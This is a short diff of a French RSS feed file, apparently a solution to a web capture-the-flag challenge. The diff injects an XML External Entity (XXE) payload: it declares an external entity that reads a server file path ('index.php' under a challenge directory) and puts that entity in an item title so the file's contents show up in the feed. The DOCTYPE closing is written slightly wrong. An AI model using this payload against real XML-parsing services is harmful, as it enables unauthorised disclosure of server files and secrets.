@@ -1,4 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE updateProfile [
+ <!ENTITY file SYSTEM "file:///challenge/web-serveur/ch29/index.php">
+]]>
 <rss version="2.0">
 <channel>
 <title>Mon site</title>
@@ -6,7 +9,7 @@
 <lastBuildDate>Wed, 27 Jul 2005 00:30:30 -0700</lastBuildDate>
 <link>www.monsite.fr</link>
 <item>
-<title>Actualité N°1</title>
+<title>&file;</title>
 <description>Ceci est ma première actualité</description>
 <pubDate>Mon, 25 Jul 2005 00:30:30 -0700</pubDate>
 <link>www.monsite.fr/actu1</link>
